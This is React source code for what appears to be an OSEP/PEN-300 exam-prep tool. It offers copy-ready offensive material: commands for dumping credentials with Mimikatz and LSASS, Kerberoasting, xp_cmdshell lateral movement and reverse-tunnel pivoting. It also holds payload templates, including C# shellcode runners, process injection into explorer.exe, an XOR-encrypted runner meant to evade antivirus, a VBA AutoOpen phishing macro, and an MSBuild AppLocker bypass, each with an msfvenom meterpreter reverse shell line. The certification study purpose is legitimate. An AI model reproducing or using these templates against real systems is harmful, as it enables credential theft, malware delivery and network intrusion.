    { q: "Did you dump credentials (Mimikatz/LSASS)?", cmd: "# Mimikatz:\nmimikatz 'privilege::debug' 'sekurlsa::logonpasswords' 'exit'\n\n# LSASS dump (AV-friendly):\nrundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump PID lsass.dmp full\n\n# Parse offline:\npypykatz lsa minidump lsass.dmp", tip: "Try comsvcs.dll dump if Mimikatz is detected. Parse the dump offline with pypykatz.", critical: true },
    { q: "Did you enumerate linked SQL servers?", cmd: "# Find MSSQL:\nnetexec mssql SUBNET -u user -p pass\n\n# Linked servers:\nSELECT * FROM sys.servers;\n\n# Execute on linked server:\nEXEC ('xp_cmdshell ''whoami''') AT [LINKED_SRV]", tip: "Linked SQL servers are a common OSEP lateral movement path. They often have xp_cmdshell enabled." },
    { q: "Did you check for Kerberos attack paths?", cmd: "# Kerberoast:\nimpacket-GetUserSPNs 'domain/user:pass' -dc-ip DC -request\nhashcat -m 13100 hashes.txt rockyou.txt\n\n# AS-REP Roast:\nimpacket-GetNPUsers 'domain/' -usersfile users.txt -dc-ip DC -request\n\n# Constrained/Unconstrained Delegation:\nimpacket-findDelegation 'domain/user:pass' -dc-ip DC", tip: "Kerberoasting is almost always possible. Even if passwords are strong, check delegation abuse paths." },
    { q: "Did you check BloodHound for ACL abuse paths?", cmd: "# Collect:\nbloodhound-python -u user -p pass -d domain.local -ns DC_IP -c all\n\n# Key queries:\n# Shortest Path to DA\n# Find Computers with Unconstrained Delegation\n# Find principals with DCSync rights\n# GenericAll / WriteDACL / ForceChangePassword", tip: "BloodHound often reveals paths that manual enumeration misses. Check for ACL abuse chains.", critical: true },
    { q: "Can you pivot to another network segment?", cmd: "# Chisel:\n# Server: chisel server --reverse -p 8000\n# Client: chisel client LHOST:8000 R:socks\n\n# Ligolo-ng:\n# Proxy: ./proxy -selfcert -laddr 0.0.0.0:11601\n# Agent: ./agent -connect LHOST:11601 -ignore-cert\n\n# Then: proxychains nmap -sT INTERNAL_NET", tip: "OSEP always has multiple network segments. You MUST pivot to find more targets." },
  ];
  return(<div>
    <div className="score-bar"><div className="score-seg" style={{background:'rgba(239,68,68,.08)',color:'var(--r)',flex:2}}>{`⚠️ OSEP Strategy: Bypass defenses first, then enumerate, then move laterally. Repeat for each segment.`}</div></div>
    <p style={{fontSize:11,color:'var(--t2)',marginBottom:14}}>Go through each question. If you answer "no" to ANY, do it before trying anything else.</p>
    {checks.map((c,i)=><div className="stuck-card" key={i}>
      <div style={{display:'flex',alignItems:'flex-start',gap:10,marginBottom:6}}>
        <div className={`phase-num`} style={{width:24,height:24,fontSize:10,flexShrink:0,background:c.critical?'var(--acd)':'var(--b0)',borderColor:c.critical?'var(--ac)':'var(--bd)',color:c.critical?'var(--ac)':'var(--t2)'}}>{i+1}</div>
        <div style={{flex:1}}>
          <div className="stuck-q">{c.q}</div>
          <div className="stuck-tip">{c.tip}</div>
        </div>
        <CopyBtn text={c.cmd}/>
      </div>
      <div className="cmd" style={{background:'var(--b0)',padding:8,borderRadius:4,fontSize:10,marginLeft:34}}>{c.cmd}</div>
    </div>)}
  </div>)
}

// ━━━ TAB: PAYLOAD TEMPLATES ━━━
function PayloadsTab({vals}){
  const v=vals;
  const[openT,setOpenT]=useState({});
  const templates=[
    { title: "💣 C# Shellcode Runner (VirtualAlloc)", desc: "Basic in-memory shellcode execution.", code: `// Compile: csc /unsafe /out:runner.exe runner.cs\nusing System;\nusing System.Runtime.InteropServices;\n\nclass Program {\n  [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr p, uint s, uint a, uint pr);\n  [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr sa, IntPtr p, uint f, IntPtr t);\n  [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint m);\n\n  static void Main() {\n    // msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${v.lhost||"LHOST"} LPORT=${v.lport||"443"} -f csharp\n    byte[] buf = new byte[] { /* SHELLCODE HERE */ };\n    IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);\n    Marshal.Copy(buf, 0, addr, buf.Length);\n    IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n    WaitForSingleObject(hThread, 0xFFFFFFFF);\n  }\n}` },
    { title: "💉 C# Process Injection (CreateRemoteThread)", desc: "Inject into explorer.exe or another legit process.", code: `using System;\nusing System.Diagnostics;\nusing System.Runtime.InteropServices;\nusing System.Text;\n\nclass Injector {\n  [DllImport("kernel32")] static extern IntPtr OpenProcess(uint a, bool b, int pid);\n  [DllImport("kernel32")] static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);\n  [DllImport("kernel32")] static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out UIntPtr w);\n  [DllImport("kernel32")] static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr sa, IntPtr p, uint f, IntPtr t);\n\n  static void Main() {\n    // msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${v.lhost||"LHOST"} LPORT=${v.lport||"443"} -f csharp\n    byte[] buf = new byte[] { /* SHELLCODE */ };\n    Process target = Process.GetProcessesByName("explorer")[0];\n    IntPtr hProc = OpenProcess(0x001F0FFF, false, target.Id);\n    IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);\n    WriteProcessMemory(hProc, addr, buf, (uint)buf.Length, out _);\n    CreateRemoteThread(hProc, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n  }\n}` },
    { title: "📦 C# with XOR Decryption", desc: "XOR-encrypt shellcode to bypass AV signatures.", code: `// STEP 1: Encrypt shellcode (run on attacker):\n// python3 -c "\n// key = 0xfa\n// with open('sc.bin','rb') as f: buf = f.read()\n// enc = bytes([b ^ key for b in buf])\n// print('byte[] buf = new byte[] {' + ','.join([f'0x{b:02x}' for b in enc]) + '};')\n// "\n\n// STEP 2: C# runner with XOR decryption at runtime:\nusing System;\nusing System.Runtime.InteropServices;\n\nclass Runner {\n  [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr p, uint s, uint a, uint pr);\n  [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr sa, IntPtr p, uint f, IntPtr t);\n  [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint m);\n\n  static void Main() {\n    byte key = 0xfa;\n    byte[] buf = new byte[] { /* XOR-ENCRYPTED SHELLCODE */ };\n    for (int i = 0; i < buf.Length; i++) buf[i] = (byte)(buf[i] ^ key);\n    IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);\n    Marshal.Copy(buf, 0, addr, buf.Length);\n    IntPtr t = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n    WaitForSingleObject(t, 0xFFFFFFFF);\n  }\n}` },
    { title: "📄 VBA Macro Shellcode Runner", desc: "For Word/Excel phishing documents.", code: `' AutoOpen() runs when document is opened\nPrivate Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddr As LongPtr, ByVal dwSize As Long, ByVal flAllocType As Long, ByVal flProtect As Long) As LongPtr\nPrivate Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttrs As Long, ByVal dwStackSize As Long, ByVal lpStartAddr As LongPtr, ByVal lpParam As LongPtr, ByVal dwCreateFlags As Long, ByRef lpThreadId As Long) As LongPtr\nPrivate Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal dest As LongPtr, ByRef src As Any, ByVal length As Long) As LongPtr\n\nSub AutoOpen()\n  Dim buf As Variant\n  ' msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=${v.lhost||"LHOST"} LPORT=${v.lport||"443"} -f vbapplication\n  buf = Array(232, 130, ...)  ' SHELLCODE HERE\n  Dim addr As LongPtr\n  addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)\n  Dim i As Long\n  For i = LBound(buf) To UBound(buf)\n    Dim b As Byte: b = buf(i)\n    RtlMoveMemory addr + i, b, 1\n  Next\n  CreateThread 0, 0, addr, 0, 0, 0\nEnd Sub` },
    { title: "🔨 MSBuild Inline Task (AppLocker Bypass)", desc: "Execute C# via MSBuild — bypasses AppLocker.", code: `<!-- payload.xml -->\n<!-- Execute: C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.xml -->\n<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">\n  <Target Name="Run"><ClassExample /></Target>\n  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory"\n    AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll">\n    <Task>\n      <Code Type="Class" Language="cs"><![CDATA[\n        using System; using System.Runtime.InteropServices;\n        using Microsoft.Build.Framework; using Microsoft.Build.Utilities;\n        public class ClassExample : Task, ITask {\n          [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr p,uint s,uint a,uint pr);\n          [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr sa,IntPtr p,uint f,IntPtr t);\n          [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h,uint m);\n          public override bool Execute() {\n            byte[] buf = new byte[] { /* SHELLCODE */ };\n            IntPtr addr = VirtualAlloc(IntPtr.Zero,(uint)buf.Length,0x3000,0x40);\n            System.Runtime.InteropServices.Marshal.Copy(buf,0,addr,buf.Length);\n            IntPtr t = CreateThread(IntPtr.Zero,0,addr,IntPtr.Zero,0,IntPtr.Zero);\n            WaitForSingleObject(t,0xFFFFFFFF);\n            return true;\n          }\n        }\n      ]]></Code>\n    </Task>\n  </UsingTask>\n</Project>` },
  ];
  return(<div>
    <div className="sec-title">Payload Templates (click to expand)</div>
    <p style={{fontSize:11,color:'var(--t2)',marginBottom:12}}>Copy and customize these templates. Replace shellcode with your msfvenom output.</p>
    {templates.map((t,i)=>(<div className="tpl-card" key={i}>
      <div className="tpl-h" onClick={()=>setOpenT(p=>({...p,[i]:!p[i]}))}>
        <div><div style={{marginBottom:2}}>{t.title}</div><div style={{fontSize:10,fontWeight:400,color:'var(--t2)'}}>{t.desc}</div></div>
        <div style={{display:'flex',gap:6,alignItems:'center'}}>
          <CopyBtn text={t.code}/>
          <span className={`arrow ${openT[i]?'open':''}`}>▶</span>
        </div>
      </div>
      {openT[i]&&<div className="tpl-body"><div className="cmd" style={{fontSize:10}}>{t.code}</div></div>}
    </div>))}
  </div>)
}

// ━━━ TAB: PIVOTING ━━━
function PivotingTab({vals}){
  const v=vals;
  const[openS,setOpenS]=useState({});
  const sections=[
    { title: "SSH Tunneling", items: [
      { label: "Dynamic SOCKS proxy", cmd: `ssh -D 1080 ${v.user||"user"}@${v.target||"TARGET"}\n# Configure proxychains: socks5 127.0.0.1 1080\nproxychains nmap -sT -p80,443,445 INTERNAL_NET` },
      { label: "Local port forward", cmd: `ssh -L 8080:INTERNAL_HOST:80 ${v.user||"user"}@${v.target||"TARGET"}\n# Now access: http://127.0.0.1:8080` },
      { label: "Remote port forward", cmd: `ssh -R 8080:127.0.0.1:80 ${v.user||"user"}@${v.target||"TARGET"}\n# Target's :8080 now reaches your :80` },
      { label: "Multi-hop SSH", cmd: `ssh -J ${v.user||"user"}@PIVOT ${v.user||"user"}@INTERNAL_TARGET` },
    ]},
    { title: "Chisel", items: [
      { label: "Reverse SOCKS proxy", cmd: `# On attacker:\nchisel server --reverse -p 8000\n\n# On target:\n./chisel client ${v.lhost||"LHOST"}:8000 R:socks\n\n# Configure proxychains: socks5 127.0.0.1 1080\nproxychains nmap -sT INTERNAL_NET` },
      { label: "Port forward", cmd: `# On attacker:\nchisel server --reverse -p 8000\n\n# On target:\n./chisel client ${v.lhost||"LHOST"}:8000 R:8080:127.0.0.1:8080` },
    ]},
    { title: "Ligolo-ng", items: [
      { label: "Full VPN-like tunnel", cmd: `# On attacker:\nsudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert -laddr 0.0.0.0:11601\n\n# On target:\n./agent -connect ${v.lhost||"LHOST"}:11601 -ignore-cert\n\n# In ligolo:\nsession\nstart\n\n# Add route:\nsudo ip route add INTERNAL_SUBNET/24 dev ligolo` },
    ]},
    { title: "sshuttle", items: [
      { label: "VPN over SSH", cmd: `sshuttle -r ${v.user||"user"}@${v.target||"TARGET"} 10.10.10.0/24` },
    ]},
    { title: "Proxychains Usage", items: [
      { label: "Scan through proxy", cmd: `# Edit /etc/proxychains4.conf:\n# socks5 127.0.0.1 1080\n\nproxychains nmap -sT -p- INTERNAL_HOST\nproxychains impacket-psexec 'domain/admin:pass'@INTERNAL_HOST\nproxychains evil-winrm -i INTERNAL_HOST -u admin -p pass` },
    ]},
  ];
  return(<div>
    <div className="sec-title">Pivoting & Tunneling Reference</div>
    <p style={{fontSize:11,color:'var(--t2)',marginBottom:12}}>OSEP requires pivoting between network segments. Set up tunnels to reach internal targets.</p>
    {sections.map((sec,si)=>(<div key={si}>
      <div className="sec-title">{sec.title}</div>
      {sec.items.map((item,ii)=>{const k=`${si}-${ii}`;return(<div key={ii}>
        <div className="qref-card" onClick={()=>setOpenS(p=>({...p,[k]:!p[k]}))}>
          <span style={{fontSize:11,fontWeight:600,color:'var(--t0)'}}>{item.label}</span>
          <CopyBtn text={item.cmd}/>
        </div>
        {openS[k]&&<div className="s-exp" style={{margin:'0 0 8px 0'}}><div className="cmd">{item.cmd}</div></div>}
      </div>)})}
    </div>))}
  </div>)
}

// ━━━ MAIN APP ━━━
const TABS=["🎯 Decision Engine","⚡ Quick Ref","🆘 I'm Stuck","💀 Payloads","🔀 Pivoting","✅ Checklist","⏱ Timer","📝 Notes"];

function App(){
  const[tab,setTab]=useState(0);
  const[lhost,setLhost]=useState("");
  const[lport,setLport]=useState("");
  const[target,setTarget]=useState("");
  const[domain,setDomain]=useState("");
  const[dc,setDc]=useState("");
  const[user,setUser]=useState("");
  const[pass,setPass]=useState("");
  const[subnet,setSubnet]=useState("");
  const vals={lhost,lport,target,domain,dc,user,pass,subnet};

  return(<>
    <style>{CSS}</style>
    <div className="app">
      <div className="hdr">
        <div><div className="logo">OSEP Autopilot</div><div className="logo-sub">PEN-300 • Evasion & Breaching Defenses</div></div>
        <div className="inps">
          <input className="inp" placeholder="LHOST" value={lhost} onChange={e=>setLhost(e.target.value)} style={{width:100}}/>
          <input className="inp" placeholder="LPORT" value={lport} onChange={e=>setLport(e.target.value)} style={{width:55}}/>
          <input className="inp" placeholder="Target IP" value={target} onChange={e=>setTarget(e.target.value)} style={{width:100}}/>
          <input className="inp" placeholder="Domain" value={domain} onChange={e=>setDomain(e.target.value)} style={{width:100}}/>
          <input className="inp" placeholder="DC IP" value={dc} onChange={e=>setDc(e.target.value)} style={{width:90}}/>
          <input className="inp" placeholder="User" value={user} onChange={e=>setUser(e.target.value)} style={{width:70}}/>
          <input className="inp" placeholder="Password" value={pass} onChange={e=>setPass(e.target.value)} style={{width:80}} type="password"/>
          <input className="inp" placeholder="Subnet" value={subnet} onChange={e=>setSubnet(e.target.value)} style={{width:110}}/>
        </div>
      </div>
      <div className="tabs">{TABS.map((t,i)=><button key={i} className={`tab ${tab===i?'on':''}`} onClick={()=>setTab(i)}>{t}</button>)}</div>
      <div className="main">
        {tab===0&&<DecisionTab vals={vals}/>}
        {tab===1&&<QuickRefTab/>}
        {tab===2&&<StuckTab/>}
        {tab===3&&<PayloadsTab vals={vals}/>}
        {tab===4&&<PivotingTab vals={vals}/>}
        {tab===5&&<ChecklistTab/>}
        {tab===6&&<TimerTab/>}
        {tab===7&&<NotesTab/>}
      </div>
    </div>
  </>)
}

ReactDOM.createRoot(document.getElementById('root')).render(<App/>);
